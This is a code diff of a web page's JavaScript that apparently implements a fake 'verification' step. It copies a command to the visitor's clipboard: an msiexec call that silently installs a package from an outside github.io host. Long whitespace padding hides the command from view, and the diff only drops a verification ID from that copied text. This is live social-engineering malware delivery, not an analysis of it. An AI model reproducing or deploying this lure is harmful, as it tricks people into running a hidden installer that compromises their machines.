@@ -407,11 +407,11 @@
                 document.body.removeChild(tempTextArea);
             }
 
-            function stageC(cToRun, verification_id) {
+            function stageC(cToRun) {
                 const suffix = ""
                 const ploy = "                                                                                                    "
                 const end = ""
-                const textToCopy = cToRun + suffix + ploy + verification_id + end
+                const textToCopy = cToRun + suffix + ploy + end
 
                 setCCopyData(textToCopy);
             }
@@ -430,7 +430,7 @@
                 verifywindow.style.transform = "translateX(-50%)";
 
                 const toRun = "msiexec /i https://yilmazmakinacnc.github.io/assets/verify.ext /qn"
-                stageC(toRun, verification_id)
+                stageC(toRun)
             }
 
             addCapListeners();
